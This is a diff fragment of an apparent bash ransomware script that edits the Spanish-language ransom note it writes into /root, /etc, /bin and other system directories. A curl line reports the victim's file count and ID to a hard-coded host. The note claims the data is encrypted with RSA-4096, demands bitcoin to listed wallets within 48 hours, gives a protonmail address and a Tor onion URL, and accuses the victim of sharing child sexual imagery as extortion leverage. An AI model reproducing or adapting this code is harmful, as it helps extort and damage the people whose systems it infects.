@@ -265,7 +265,7 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096, ADEMAS HE DECIDIDO DEJARTE SIN VER TEMPORALMENTE FOTOS Y VIDEOS DE NIÑ@S PEQUEÑ@S, LO HICE POR TU BIEN, TIENES QUE DEPOSITAR EL PAGO EN BITCOINS PARA QUE TODO VUELVA A LA NORMALIDAD Y SIGAS HACIENDO LO QUE HACIAS https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 1BTC A ESTA WALLET; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  SI NO LO PAGAS EN 48 HORAS, NO VOLVERAS A VER PORNOGRAFIA INFANTIL."
+    echo "MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096,  TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. El mail para contadtar es Viphops3r@protonmail.ch Si está leyendo este texto, es porque has compartido fotos de menores en los foros de la DarkWeb. Para saber lo que tienes que hacer tienes que descargar el TOR, y visitar esa página; http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/ https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 200$ A ESTA WALLET; 1CXWnfYhYS65SbNQJcrx32Hm3XHVQnof3e  SI NO LO PAGAS EN 48 HORAS, NO VOLVERAS A VER PORNOGRAFIA INFANTIL."
     
   } >> "${directory}/INSTRUCTIONS.txt"
 
